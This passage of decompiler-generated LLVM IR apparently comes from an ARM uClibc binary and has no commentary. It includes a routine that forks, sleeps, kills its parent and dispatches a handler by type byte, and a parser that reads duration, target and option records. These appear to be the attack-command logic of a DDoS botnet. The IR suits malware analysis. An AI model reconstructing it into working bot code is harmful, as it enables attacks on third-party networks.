  uselistorder i32* %r2.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* bitcast (i32** @global_var_1a680.60 to i32*), { 2, 0, 1, 3 }
  uselistorder i32** @global_var_1a680.60, { 1, 0 }
  uselistorder i8** @global_var_1a69c.57, { 1, 0 }
  uselistorder label %dec_label_pc_8e04.dec_label_pc_8e04_crit_edge, { 1, 0 }
}

define i32 @function_8e50(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8e50:
  %v0_8e50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8e50, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_8e50
  store i32 %arg3, i32* %arg2, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_8e50, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_8e5c() local_unnamed_addr {
.thread:
  %v2_8e7c = load i32, i32* inttoptr (i32 107780 to i32*), align 4
  %v2_8e80 = icmp eq i32 %v2_8e7c, 0
  br i1 %v2_8e80, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 107780

bb2:                                              ; preds = %.thread
  ret i32 107780

; uselistorder directives
  uselistorder i32 107780, { 1, 0, 2 }
}

define i32 @function_8eb4() local_unnamed_addr {
dec_label_pc_8eb4:
  %v5_8eb8 = load i32, i32* @r0, align 4
  ret i32 %v5_8eb8
}

; Function Attrs: noreturn
define i32 @__start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8ec4 = ptrtoint i32* %stack_var_4 to i32
  %v7_8ee4 = call i32 @___uClibc_main(i32 ptrtoint (i32* @global_var_ef10.72 to i32), i32 %arg2, i32 %v4_8ec4, i32 35660, i32 74328, i32 %arg1, i32 %v4_8ec4)
  call void @abort()
  unreachable
}

define i32 @function_8ef8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8ef8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_8ef8 = urem i32 %arg1, 256
  %v2_8efc = icmp eq i32 %v1_8ef8, 0
  %v1_8f04 = urem i32 %arg3, 256
  br i1 %v2_8efc, label %dec_label_pc_8f48, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  %v0_8f10 = load i32, i32* %r1.global-to-local, align 4
  %v1_8f10 = add i32 %v0_8f10, 4
  %v2_8f10 = inttoptr i32 %v1_8f10 to i8*
  %v3_8f10 = load i8, i8* %v2_8f10, align 1
  %v4_8f10 = zext i8 %v3_8f10 to i32
  %v9_8f14 = icmp eq i32 %v4_8f10, %v1_8f04
  br i1 %v9_8f14, label %dec_label_pc_8f50, label %dec_label_pc_8f38.preheader

dec_label_pc_8f38.preheader:                      ; preds = %dec_label_pc_8f10
  br label %dec_label_pc_8f38

dec_label_pc_8f28:                                ; preds = %dec_label_pc_8f38
  %v1_8f28 = add i32 %v0_8f30.in, 12
  %v2_8f28 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f28 = load i8, i8* %v2_8f28, align 1
  %v4_8f28 = zext i8 %v3_8f28 to i32
  %v9_8f2c = icmp eq i32 %v4_8f28, %v1_8f04
  br i1 %v9_8f2c, label %dec_label_pc_8f50, label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f38.preheader, %dec_label_pc_8f28
  %v0_8f30.in = phi i32 [ %v0_8f10, %dec_label_pc_8f38.preheader ], [ %v0_8f30, %dec_label_pc_8f28 ]
  %v0_8f38 = phi i32 [ 0, %dec_label_pc_8f38.preheader ], [ %v1_8f38, %dec_label_pc_8f28 ]
  %v0_8f30 = add i32 %v0_8f30.in, 8
  %v1_8f38 = add i32 %v0_8f38, 1
  %v9_8f3c = icmp eq i32 %v1_8f38, %v1_8ef8
  store i32 %v0_8f30, i32* %r1.global-to-local, align 4
  br i1 %v9_8f3c, label %dec_label_pc_8f48, label %dec_label_pc_8f28

dec_label_pc_8f48:                                ; preds = %dec_label_pc_8f38, %dec_label_pc_8ef8
  ret i32 %arg4

dec_label_pc_8f50:                                ; preds = %dec_label_pc_8f28, %dec_label_pc_8f10
  %v0_8f50 = phi i32 [ %v0_8f10, %dec_label_pc_8f10 ], [ %v0_8f30, %dec_label_pc_8f28 ]
  %v1_8f50 = inttoptr i32 %v0_8f50 to i32*
  %v2_8f50 = load i32, i32* %v1_8f50, align 4
  ret i32 %v2_8f50

; uselistorder directives
  uselistorder i32 %v1_8f38, { 1, 0 }
  uselistorder i32 %v0_8f30, { 1, 0, 2 }
  uselistorder i32 %v0_8f30.in, { 1, 0 }
  uselistorder i32 %v0_8f10, { 1, 0, 2 }
  uselistorder i32 %v1_8f04, { 1, 0 }
  uselistorder i32 %v1_8ef8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8f38, { 1, 0 }
}

define i32 @function_8f5c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8f5c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_8f5c = load i32, i32* @r4, align 4
  store i32 %v3_8f5c, i32* %stack_var_-32, align 4
  %v6_8f5c = load i32, i32* @r5, align 4
  %v9_8f5c = load i32, i32* @r6, align 4
  %v12_8f5c = load i32, i32* @r7, align 4
  %v18_8f5c = load i32, i32* @sb, align 4
  %v0_8f60 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8f60, i32* @sb, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_8f68 = urem i32 %arg2, 256
  store i32 %v1_8f68, i32* %r7.global-to-local, align 4
  %v0_8f74 = call i32 @fork()
  %v2_8f78 = icmp eq i32 %v0_8f74, -1
  %. = zext i1 %v2_8f78 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8f74, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_8f5c
  store i32 1, i32* %r5.global-to-local, align 4
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_8f5c
  store i32 %., i32* %r5.global-to-local, align 4
  %v2_8f90 = icmp eq i1 %v2_8f78, false
  br i1 %v2_8f90, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  %v3_8f94 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_8f94, i32* %r4.global-to-local, align 4
  store i32 %v6_8f5c, i32* %r5.global-to-local, align 4
  store i32 %v9_8f5c, i32* %r6.global-to-local, align 4
  store i32 %v12_8f5c, i32* %r7.global-to-local, align 4
  store i32 %v18_8f5c, i32* @sb, align 4
  ret i32 %v0_8f74

bb26:                                             ; preds = %bb24
  %v0_8f98 = call i32 @fork()
  %v2_8f9c = icmp eq i32 %v0_8f98, -1
  store i32 %v0_8f98, i32* %r4.global-to-local, align 4
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_8fa8

dec_label_pc_8fa8:                                ; preds = %bb26
  %v2_8fa8 = icmp eq i32 %v0_8f98, 0
  br i1 %v2_8fa8, label %dec_label_pc_8fb0, label %dec_label_pc_8fd4

dec_label_pc_8fb0:                                ; preds = %dec_label_pc_8fa8
  %v0_8fb0 = load i32, i32* %r6.global-to-local, align 4
  %v1_8fb4 = call i32 @sleep(i32 %v0_8fb0)
  %v0_8fb8 = call i32 @getppid()
  %v2_8fc0 = call i32 @kill(i32 %v0_8fb8, i32 9)
  %v0_8fc4 = load i32, i32* %r4.global-to-local, align 4
  call void @exit(i32 %v0_8fc4)
  unreachable

dec_label_pc_8fcc:                                ; preds = %bb26
  %v0_8fcc = load i32, i32* %r5.global-to-local, align 4
  call void @exit(i32 %v0_8fcc)
  unreachable

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fa8
  store i32 ptrtoint (i8** @global_var_1a6b8.75 to i32), i32* %r3.global-to-local, align 4
  %v2_8fd8 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_8fd8 = zext i8 %v2_8fd8 to i32
  %v2_8fdc = icmp eq i8 %v2_8fd8, 0
  br i1 %v2_8fdc, label %dec_label_pc_9020, label %dec_label_pc_8fe4

dec_label_pc_8fe4:                                ; preds = %dec_label_pc_8fd4
  store i32 ptrtoint (i32* @global_var_1a6bc.77 to i32), i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @global_var_1a6bc.77, align 4
  %v1_8fec = inttoptr i32 %v2_8fe8 to i32*
  %v2_8fec = load i32, i32* %v1_8fec, align 4
  %v1_8ff0 = add i32 %v2_8fec, 4
  %v2_8ff0 = inttoptr i32 %v1_8ff0 to i8*
  %v3_8ff0 = load i8, i8* %v2_8ff0, align 1
  %v4_8ff0 = zext i8 %v3_8ff0 to i32
  store i32 %v4_8ff0, i32* %r3.global-to-local, align 4
  %v1_8ff4 = load i32, i32* %r7.global-to-local, align 4
  %v9_8ff4 = icmp eq i32 %v4_8ff0, %v1_8ff4
  br i1 %v9_8ff4, label %dec_label_pc_9028, label %dec_label_pc_9014.preheader

dec_label_pc_9014.preheader:                      ; preds = %dec_label_pc_8fe4
  %v1_8ff8 = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9004:                                ; preds = %dec_label_pc_9014
  %v4_9004 = mul i32 %v1_9014, 4
  %v5_9004 = add i32 %v4_9004, %v2_8fe8
  %v6_9004 = inttoptr i32 %v5_9004 to i32*
  %v7_9004 = load i32, i32* %v6_9004, align 4
  %v1_9008 = add i32 %v7_9004, 4
  %v2_9008 = inttoptr i32 %v1_9008 to i8*
  %v3_9008 = load i8, i8* %v2_9008, align 1
  %v4_9008 = zext i8 %v3_9008 to i32
  store i32 %v4_9008, i32* %r3.global-to-local, align 4
  %v9_900c = icmp eq i32 %v4_9008, %v1_8ff4
  br i1 %v9_900c, label %dec_label_pc_9028, label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %dec_label_pc_9014.preheader, %dec_label_pc_9004
  %v0_9014 = phi i32 [ %v1_8ff8, %dec_label_pc_9014.preheader ], [ %v1_9014, %dec_label_pc_9004 ]
  %v1_9014 = add i32 %v0_9014, 1
  %v9_9018 = icmp eq i32 %v1_9014, %v3_8fd8
  br i1 %v9_9018, label %dec_label_pc_9020, label %dec_label_pc_9004

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014, %dec_label_pc_8fd4, %dec_label_pc_9028
  call void @exit(i32 0)
  unreachable

dec_label_pc_9028:                                ; preds = %dec_label_pc_9004, %dec_label_pc_8fe4
  %v0_903c = phi i32 [ %v2_8fec, %dec_label_pc_8fe4 ], [ %v7_9004, %dec_label_pc_9004 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_903c = inttoptr i32 %v0_903c to i32*
  %v2_903c = load i32, i32* %v1_903c, align 4
  call void @__pseudo_branch(i32 %v2_903c)
  br label %dec_label_pc_9020

; uselistorder directives
  uselistorder i32 %v1_9014, { 2, 0, 1 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v2_8f78, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder label %dec_label_pc_9020, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_904c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_904c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_904c = load i32, i32* @r6, align 4
  %v12_904c = load i32, i32* @r7, align 4
  %v18_904c = load i32, i32* @sb, align 4
  %v21_904c = load i32, i32* @sl, align 4
  %v27_904c = load i32, i32* @lr, align 4
  %v7_9050 = icmp eq i32 %arg2, 3
  store i1 %v7_9050, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_905c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_905c, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_9070, label %dec_label_pc_9064

dec_label_pc_9064:                                ; preds = %dec_label_pc_904c
  %v7_9064 = icmp eq i32 %arg2, 4
  store i1 %v7_9064, i1* %cpsr_z.global-to-local, align 1
  %v1_9068 = inttoptr i32 %v0_905c to i32*
  %v2_9068 = load i32, i32* %v1_9068, align 4
  store i32 %v2_9068, i32* @sl, align 4
  br i1 %v7_9064, label %dec_label_pc_9070, label %dec_label_pc_9078

dec_label_pc_9070:                                ; preds = %dec_label_pc_9094, %.dec_label_pc_9070_crit_edge, %dec_label_pc_9064, %dec_label_pc_9088, %dec_label_pc_9078, %dec_label_pc_904c
  %v29_9074 = phi i32 [ %v29_9074.pre, %.dec_label_pc_9070_crit_edge ], [ %v0_905c, %dec_label_pc_9094 ], [ %v0_905c, %dec_label_pc_9064 ], [ %v0_905c, %dec_label_pc_9088 ], [ %v0_905c, %dec_label_pc_9078 ], [ %v0_905c, %dec_label_pc_904c ]
  store i32 %v9_904c, i32* @r6, align 4
  store i32 %v12_904c, i32* @r7, align 4
  store i32 %v18_904c, i32* @sb, align 4
  store i32 %v21_904c, i32* @sl, align 4
  ret i32 %v29_9074

dec_label_pc_9078:                                ; preds = %dec_label_pc_9064
  %v7_9078 = icmp eq i32 %arg2, 5
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  %v1_907c = add i32 %v0_905c, 4
  %v2_907c = inttoptr i32 %v1_907c to i8*
  %v3_907c = load i8, i8* %v2_907c, align 1
  %v4_907c = zext i8 %v3_907c to i32
  store i32 %v4_907c, i32* %r1.global-to-local, align 4
  br i1 %v7_9078, label %dec_label_pc_9070, label %dec_label_pc_9088

dec_label_pc_9088:                                ; preds = %dec_label_pc_9078
  %v1_9088 = add i32 %v0_905c, 5
  %v2_9088 = inttoptr i32 %v1_9088 to i8*
  %v3_9088 = load i8, i8* %v2_9088, align 1
  %v4_9088 = zext i8 %v3_9088 to i32
  store i32 %v4_9088, i32* @r7, align 4
  %v2_908c = icmp eq i8 %v3_9088, 0
  store i1 %v2_908c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_908c, label %dec_label_pc_9070, label %dec_label_pc_9094

dec_label_pc_9094:                                ; preds = %dec_label_pc_9088
  %v3_9094 = mul nuw nsw i32 %v4_9088, 4
  store i32 %v3_9094, i32* @sb, align 4
  %v1_9098 = add i32 %arg2, -6
  store i32 %v1_9098, i32* @r6, align 4
  %v2_909c = mul nuw nsw i32 %v4_9088, 5
  store i32 %v2_909c, i32* @r8, align 4
  %v3_90a0 = icmp ult i32 %v1_9098, %v2_909c
  %v9_90a0 = icmp eq i32 %v1_9098, %v2_909c
  store i1 %v9_90a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_90a0, label %dec_label_pc_9070, label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_9094
  store i32 %v4_9088, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_90b0 = call i32* @calloc(i32 %v4_9088, i32 24)
  %v4_90b0 = ptrtoint i32* %v2_90b0 to i32
  store i32 %v4_90b0, i32* %r0.global-to-local, align 4
  %v0_90b4 = load i32, i32* @r7, align 4
  %v2_90b4 = icmp eq i32 %v0_90b4, 0
  store i1 %v2_90b4, i1* %cpsr_z.global-to-local, align 1
  %v0_90bc = load i32, i32* @r4, align 4
  %v1_90bc = add i32 %v0_90bc, 6
  store i32 %v1_90bc, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_90b4, 1
  br i1 %tmp27, label %dec_label_pc_9114thread-pre-split, label %dec_label_pc_90c4

dec_label_pc_90c4:                                ; preds = %dec_label_pc_90a8
  store i32 %v4_90b0, i32* %r1.global-to-local, align 4
  %v1_90c8 = load i32, i32* @r8, align 4
  %v2_90c8 = add i32 %v1_90c8, %v0_90bc
  store i32 %v2_90c8, i32* %ip.global-to-local, align 4
  store i32 %v0_90bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_90d8

dec_label_pc_90d8:                                ; preds = %dec_label_pc_90d8.dec_label_pc_90d8_crit_edge, %dec_label_pc_90c4
  %v2_90e8 = phi i32 [ %v1_90fc, %dec_label_pc_90d8.dec_label_pc_90d8_crit_edge ], [ %v4_90b0, %dec_label_pc_90c4 ]
  %v1_90e4 = phi i32 [ %v1_90e4.pre, %dec_label_pc_90d8.dec_label_pc_90d8_crit_edge ], [ %v2_90c8, %dec_label_pc_90c4 ]
  %v0_90e0 = phi i32 [ %v0_90d8.pre, %dec_label_pc_90d8.dec_label_pc_90d8_crit_edge ], [ %v0_90bc, %dec_label_pc_90c4 ]
  %v1_90d8 = add i32 %v0_90e0, 10
  %v2_90d8 = inttoptr i32 %v1_90d8 to i8*
  %v3_90d8 = load i8, i8* %v2_90d8, align 1
  %v1_90dc = add i32 %v0_90e0, 6
  %v2_90dc = inttoptr i32 %v1_90dc to i32*
  %v3_90dc = load i32, i32* %v2_90dc, align 4
  store i32 %v3_90dc, i32* %r2.global-to-local, align 4
  %v1_90e0 = add i32 %v0_90e0, 5
  store i32 %v1_90e0, i32* %r0.global-to-local, align 4
  %v9_90e4 = icmp eq i32 %v1_90e0, %v1_90e4
  store i1 %v9_90e4, i1* %cpsr_z.global-to-local, align 1
  %v3_90e8 = add i32 %v2_90e8, 20
  %v4_90e8 = inttoptr i32 %v3_90e8 to i8*
  store i8 %v3_90d8, i8* %v4_90e8, align 1
  %v0_90ec = load i32, i32* %r2.global-to-local, align 4
  %v1_90ec = load i32, i32* %r1.global-to-local, align 4
  %v2_90ec = add i32 %v1_90ec, 4
  %v3_90ec = inttoptr i32 %v2_90ec to i32*
  store i32 %v0_90ec, i32* %v3_90ec, align 4
  %v0_90f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_90f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_90f0 = add i32 %v1_90f0, 16
  %v3_90f0 = inttoptr i32 %v2_90f0 to i32*
  store i32 %v0_90f0, i32* %v3_90f0, align 4
  %v0_90f4 = load i32, i32* @r4, align 4
  %v1_90f4 = trunc i32 %v0_90f4 to i8
  %v2_90f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_90f4 = inttoptr i32 %v2_90f4 to i8*
  store i8 %v1_90f4, i8* %v3_90f4, align 1
  %v0_90f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_90f8 = trunc i32 %v0_90f8 to i8
  %v2_90f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_90f8 = add i32 %v2_90f8, 1
  %v4_90f8 = inttoptr i32 %v3_90f8 to i8*
  store i8 %v1_90f8, i8* %v4_90f8, align 1
  %v0_90fc = load i32, i32* %r1.global-to-local, align 4
  %v1_90fc = add i32 %v0_90fc, 24
  store i32 %v1_90fc, i32* %r1.global-to-local, align 4
  %v0_9100 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9100, label %dec_label_pc_9104, label %dec_label_pc_90d8.dec_label_pc_90d8_crit_edge

dec_label_pc_90d8.dec_label_pc_90d8_crit_edge:    ; preds = %dec_label_pc_90d8
  %v0_90d8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_90e4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_90d8

dec_label_pc_9104:                                ; preds = %dec_label_pc_90d8
  %v0_9104 = load i32, i32* @sb, align 4
  %v1_9104 = load i32, i32* @r7, align 4
  %v1_9108 = load i32, i32* @r5, align 4
  %sum = add i32 %v1_9104, %v0_9104
  %v2_9108 = sub i32 %v1_9108, %sum
  %v0_910c = load i32, i32* %r0.global-to-local, align 4
  %v1_910c = add i32 %v0_910c, 6
  store i32 %v1_910c, i32* %fp.global-to-local, align 4
  %v1_9110 = add i32 %v2_9108, -6
  store i32 %v1_9110, i32* @r6, align 4
  br label %dec_label_pc_9114

dec_label_pc_9114thread-pre-split:                ; preds = %dec_label_pc_90a8
  %v0_9114.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_9114

dec_label_pc_9114:                                ; preds = %dec_label_pc_9114thread-pre-split, %dec_label_pc_9104
  %v0_9120 = phi i32 [ %v1_90bc, %dec_label_pc_9114thread-pre-split ], [ %v1_910c, %dec_label_pc_9104 ]
  %v1_9118 = phi i32 [ %v0_9114.pr, %dec_label_pc_9114thread-pre-split ], [ %v1_9110, %dec_label_pc_9104 ]
  %v2_9114 = icmp eq i32 %v1_9118, 0
  store i1 %v2_9114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9114, label %dec_label_pc_924c, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %dec_label_pc_9114
  %v1_9120 = inttoptr i32 %v0_9120 to i8*
  %v2_9120 = load i8, i8* %v1_9120, align 1
  %v3_9120 = zext i8 %v2_9120 to i32
  store i32 %v3_9120, i32* @sb, align 4
  %v2_9124 = icmp eq i8 %v2_9120, 0
  store i1 %v2_9124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9124, label %dec_label_pc_9204, label %dec_label_pc_9134

dec_label_pc_9134:                                ; preds = %dec_label_pc_9120
  store i32 %v3_9120, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_913c = call i32* @calloc(i32 %v3_9120, i32 8)
  %v4_913c = ptrtoint i32* %v2_913c to i32
  store i32 %v4_913c, i32* %r0.global-to-local, align 4
  %v0_9140 = load i32, i32* @sb, align 4
  %v2_9140 = icmp eq i32 %v0_9140, 0
  store i1 %v2_9140, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_9140, 1
  br i1 %tmp28, label %dec_label_pc_9204, label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9134
  %v0_9150 = load i32, i32* @r6, align 4
  %v1_9150 = add i32 %v0_9150, -1
  store i32 %v1_9150, i32* %r2.global-to-local, align 4
  %v7_9150 = icmp eq i32 %v0_9150, 1
  store i1 %v7_9150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9150, label %dec_label_pc_924c, label %dec_label_pc_9158

dec_label_pc_9158:                                ; preds = %dec_label_pc_9150
  %v0_9158 = load i32, i32* %fp.global-to-local, align 4
  %v1_9158 = add i32 %v0_9158, 1
  %v2_9158 = inttoptr i32 %v1_9158 to i8*
  %v3_9158 = load i8, i8* %v2_9158, align 1
  %v1_915c = add i32 %v0_9150, -2
  store i32 %v1_915c, i32* %r2.global-to-local, align 4
  %v7_915c = icmp eq i32 %v1_9150, 1
  store i1 %v7_915c, i1* %cpsr_z.global-to-local, align 1
  %v3_9160 = add i32 %v4_913c, 4
  %v4_9160 = inttoptr i32 %v3_9160 to i8*
  store i8 %v3_9158, i8* %v4_9160, align 1
  %v0_9164 = load i32, i32* %fp.global-to-local, align 4
  %v1_9164 = add i32 %v0_9164, 1
  store i32 %v1_9164, i32* %r0.global-to-local, align 4
  %v0_9168 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9168, label %dec_label_pc_924c, label %dec_label_pc_916c

dec_label_pc_916c:                                ; preds = %dec_label_pc_9158
  %v1_916c = add i32 %v0_9164, 2
  %v2_916c = inttoptr i32 %v1_916c to i8*
  %v3_916c = load i8, i8* %v2_916c, align 1
  %v4_916c = zext i8 %v3_916c to i32
  store i32 %v4_916c, i32* @r4, align 4
  %v0_9170 = load i32, i32* %r2.global-to-local, align 4
  %v1_9170 = add i32 %v0_9170, -1
  store i32 %v1_9170, i32* @r8, align 4
  %v9_9174 = icmp eq i32 %v1_9170, %v4_916c
  store i1 %v9_9174, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_916c, i32* %r0.global-to-local, align 4
  %v5_917c = icmp slt i32 %v1_9170, %v4_916c
  br i1 %v5_917c, label %dec_label_pc_924c, label %dec_label_pc_9180

dec_label_pc_9180:                                ; preds = %dec_label_pc_916c
  store i32 %v4_913c, i32* @r5, align 4
  %v1_9188 = add i32 %v4_913c, 8
  %v1_918c = add i32 %v0_9164, 3
  store i32 %v1_918c, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_91d0

dec_label_pc_919c:                                ; preds = %dec_label_pc_91d0
  %v0_919c = load i32, i32* @r8, align 4
  %v1_919c = load i32, i32* @r4, align 4
  %v2_919c = sub i32 %v0_919c, %v1_919c
  store i32 %v2_919c, i32* %r2.global-to-local, align 4
  %v9_919c = icmp eq i32 %v0_919c, %v1_919c
  store i1 %v9_919c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_919c, label %dec_label_pc_924c, label %dec_label_pc_91a4

dec_label_pc_91a4:                                ; preds = %dec_label_pc_919c
  %v1_91a4 = load i32, i32* @r6, align 4
  %v2_91a4 = add i32 %v1_91a4, %v1_919c
  %v3_91a4 = inttoptr i32 %v2_91a4 to i8*
  %v4_91a4 = load i8, i8* %v3_91a4, align 1
  store i32 %v2_91a4, i32* %r0.global-to-local, align 4
  %v1_91ac = add i32 %v2_919c, -1
  store i32 %v1_91ac, i32* %r2.global-to-local, align 4
  %v7_91ac = icmp eq i32 %v2_919c, 1
  store i1 %v7_91ac, i1* %cpsr_z.global-to-local, align 1
  %v3_91b0 = add i32 %v2_91b0, 4
  %v4_91b0 = inttoptr i32 %v3_91b0 to i8*
  store i8 %v4_91a4, i8* %v4_91b0, align 1
  %v0_91b4 = load i32, i32* %r0.global-to-local, align 4
  %v0_91b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_91b8 = add i32 %v0_91b8, -1
  store i32 %v1_91b8, i32* @r8, align 4
  %v1_91bc = add i32 %v0_91b4, 2
  store i32 %v1_91bc, i32* @r6, align 4
  %v0_91c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_91c0, label %dec_label_pc_924c, label %dec_label_pc_91c4

dec_label_pc_91c4:                                ; preds = %dec_label_pc_91a4
  %v1_91b4 = add i32 %v0_91b4, 1
  %v2_91c4 = inttoptr i32 %v1_91b4 to i8*
  %v3_91c4 = load i8, i8* %v2_91c4, align 1
  %v4_91c4 = zext i8 %v3_91c4 to i32
  store i32 %v4_91c4, i32* @r4, align 4
  %v2_91c8 = sub i32 %v1_91b8, %v4_91c4
  %tmp30 = sub i32 0, %v2_91c8
  %v6_91c8 = and i32 %v1_91b8, %tmp30
  %v7_91c8 = icmp slt i32 %v6_91c8, 0
  %v8_91c8 = icmp slt i32 %v2_91c8, 0
  %v9_91c8 = icmp eq i32 %v1_91b8, %v4_91c4
  store i1 %v9_91c8, i1* %cpsr_z.global-to-local, align 1
  %v2_91cc = xor i1 %v8_91c8, %v7_91c8
  br i1 %v2_91cc, label %dec_label_pc_924c, label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %dec_label_pc_91c4, %dec_label_pc_9180
  %v0_91d4 = phi i32 [ %v4_916c, %dec_label_pc_9180 ], [ %v4_91c4, %dec_label_pc_91c4 ]
  %v2_91b0 = phi i32 [ %v1_9188, %dec_label_pc_9180 ], [ %v1_91f4, %dec_label_pc_91c4 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_91d4 = add nuw nsw i32 %v0_91d4, 1
  store i32 %v1_91d4, i32* %r0.global-to-local, align 4
  %v2_91d8 = call i32* @calloc(i32 %v1_91d4, i32 1)
  %v3_91d8 = ptrtoint i32* %v2_91d8 to i32
  store i32 %v3_91d8, i32* %r0.global-to-local, align 4
  %v0_91dc = load i32, i32* @r6, align 4
  store i32 %v0_91dc, i32* %r1.global-to-local, align 4
  %v1_91e0 = load i32, i32* @r5, align 4
  %v2_91e0 = inttoptr i32 %v1_91e0 to i32*
  store i32 %v3_91d8, i32* %v2_91e0, align 4
  %v0_91e4 = load i32, i32* @r4, align 4
  store i32 %v0_91e4, i32* %r2.global-to-local, align 4
  %v3_91e8 = call i32 @function_11a58(i32 %v3_91d8, i32 %v0_91dc, i32 %v0_91e4)
  store i32 %v3_91e8, i32* %r0.global-to-local, align 4
  store i32 %v2_91b0, i32* @r5, align 4
  %v0_91f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_91f0 = add i32 %v0_91f0, 1
  store i32 %v1_91f0, i32* %fp.global-to-local, align 4
  %v1_91f4 = add i32 %v2_91b0, 8
  store i32 %v1_91f4, i32* %ip.global-to-local, align 4
  %v1_91f8 = load i32, i32* @sb, align 4
  %v9_91f8 = icmp eq i32 %v1_91f0, %v1_91f8
  store i1 %v9_91f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_91f8, label %dec_label_pc_9204, label %dec_label_pc_919c

